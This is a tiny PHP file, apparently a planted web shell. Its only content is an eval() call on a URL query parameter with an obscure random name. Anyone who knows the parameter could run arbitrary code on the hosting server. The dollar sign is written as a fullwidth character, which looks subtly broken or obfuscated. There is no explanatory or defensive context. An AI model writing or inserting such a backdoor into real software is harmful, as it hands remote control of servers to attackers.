<?php
eval(＄_GET['xLDieTDq']);
?>
